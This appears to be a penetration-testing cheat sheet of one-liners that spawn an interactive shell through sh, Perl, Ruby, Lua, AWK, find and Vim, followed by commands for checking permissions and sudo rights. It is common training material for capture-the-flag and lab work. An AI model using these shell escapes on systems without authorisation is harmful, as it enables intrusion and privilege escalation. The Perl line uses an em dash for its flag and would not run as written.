Bourne shell
```shell-session
/bin/sh -i
```
- -i = interactive mode

Perl
```shell-session
perl —e 'exec "/bin/sh";'
```
```shell-session
perl —e 'exec "/bin/sh";'
```

Ruby
```shell-session
ruby: exec "/bin/sh"
```

Lua
```shell-session
lua: os.execute('/bin/sh')
```

AWK
```shell-session
awk 'BEGIN {system("/bin/sh")}'
```

Find
```shell-session
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
```

Exec
```shell-session
find . -exec /bin/sh \; -quit
```
- if find can't find the file, no shell will spawn

Vim to Shell
```shell-session
vim -c ':!/bin/sh'
```
```shell-session
vim
:set shell=/bin/sh
:shell
```

Identify permissions
```shell-session
ls -la
```

Identify escalation of privileges
```shell-session
sudo -l
```

